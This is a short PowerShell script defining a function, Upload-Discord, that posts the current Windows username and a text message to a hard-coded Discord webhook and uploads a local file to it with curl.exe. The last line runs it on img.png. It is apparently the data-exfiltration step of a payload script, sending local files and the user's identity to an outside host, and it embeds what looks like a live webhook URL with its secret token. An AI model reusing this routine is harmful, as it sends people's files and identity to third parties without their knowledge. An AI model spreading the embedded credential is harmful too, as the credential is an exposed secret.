function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'https://discord.com/api/webhooks/1215498255593639996/9XYdMB4oJjrL1gyLZM1KLJK0BuQLkMQVk7CCNA0d6hcurPmMHo-spwPpdDyoZycb0Gah'

$Body = @{
  'username' = $env:username
  'content' = $text
}

Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}

Upload-Discord -file img.png -text response
